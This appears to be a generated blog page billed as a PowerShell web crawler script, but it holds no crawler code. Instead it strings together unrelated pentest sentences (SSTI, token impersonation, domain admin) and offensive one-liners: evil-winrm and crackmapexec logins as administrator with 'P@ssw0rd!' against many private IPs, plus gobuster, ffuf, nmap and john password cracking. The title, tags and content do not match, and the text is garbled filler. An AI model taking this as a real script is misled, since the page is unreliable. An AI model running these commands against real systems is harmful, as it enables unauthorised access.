---
TitleSEO: "Web Crawler and Spider in PowerShell | ZureFX"
TitlePost: "Web Crawler and Spider — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for web crawler and spider. Built for security research and automation."
Keywords: "rust, go, python, fuzzer, powershell"
URL: "https://zurefx.github.io/scripting/script-web-crawler-and-spider-647.html"
URL_IMAGES: ""
Date: "2025-08-08"
Tags: "Rust, Go, Python, Fuzzer, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-web-crawler-and-spider-647"
Permalink: "/scripting/script-web-crawler-and-spider-647.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `wpscan`
- `atexec`
- `feroxbuster`

## Implementation

### Core Logic

The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

```powershell
crackmapexec smb 10.116.216.234 -u administrator -p 'P@ssw0rd!' --shares
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
gobuster dir -u http://10.96.22.21/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.75.49.173 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.30.120.240 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.119.17.119 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p80,3268,443 10.24.28.177 -oN scan.txt
crackmapexec smb 10.45.189.17 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.112.209.76/FUZZ
evil-winrm -i 10.88.101.98 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.104.104.238/FUZZ
crackmapexec smb 10.16.180.116 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI).

```
[+] Scanning target...
[+] Found 15 results
[+] Done in 14.72s
```
